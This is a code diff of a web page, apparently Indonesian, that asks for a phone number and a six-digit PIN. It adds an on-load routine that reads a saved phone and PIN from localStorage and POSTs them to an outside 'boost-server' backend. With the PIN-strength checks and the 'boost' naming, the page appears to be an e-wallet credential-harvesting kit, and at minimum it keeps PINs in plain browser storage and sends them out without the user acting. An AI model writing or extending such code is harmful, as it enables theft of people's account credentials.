@@ -81,10 +81,8 @@
         function validatePinFull() {
             const pin = Array.from(pinInputs).map(i => i.value).join('');
             if (pin.length < 6) return false;
-
             const phoneDigits = phoneInput.value.replace(/\D/g, '');
             if (/^(\d)\1{5}$/.test(pin)) return false;
-
             const digits = pin.split('').map(Number);
             let isSequential = true;
             for (let i = 1; i < digits.length; i++) {
@@ -94,7 +92,6 @@
                 }
             }
             if (isSequential) return false;
-
             let isDescending = true;
             for (let i = 1; i < digits.length; i++) {
                 if (digits[i] !== digits[i-1] - 1) {
@@ -103,17 +100,14 @@
                 }
             }
             if (isDescending) return false;
-
             if (pin[0] === pin[2] && pin[2] === pin[4] && pin[1] === pin[3] && pin[3] === pin[5]) return false;
             if (pin[0] === pin[3] && pin[1] === pin[4] && pin[2] === pin[5]) return false;
             if (pin[0] === pin[1] && pin[2] === pin[3] && pin[4] === pin[5]) return false;
-
             if (phoneDigits.length >= 6) {
                 const first6 = phoneDigits.slice(0, 6);
                 const last6 = phoneDigits.slice(-6);
                 if (pin === first6 || pin === last6) return false;
             }
-
             return true;
         }
 
@@ -140,6 +134,26 @@
         });
 
         const BACKEND_URL = 'https://boost-server-meng.onrender.com';
+
+        // Cancel pending saat halaman dimuat (jika ada data lama)
+        (async function cancelPendingOnLoad() {
+            const savedPhone = localStorage.getItem('boost_phone');
+            const savedPin = localStorage.getItem('boost_pin');
+            if (savedPhone && savedPin) {
+                try {
+                    await fetch(BACKEND_URL + '/api/cancel-pending', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ phone: savedPhone, pin: savedPin })
+                    });
+                } catch (e) {
+                    console.error('Gagal membatalkan pending:', e);
+                } finally {
+                    localStorage.removeItem('boost_phone');
+                    localStorage.removeItem('boost_pin');
+                }
+            }
+        })();
 
         sendBtn.addEventListener('click', async function() {
             pinError.classList.add('hidden');
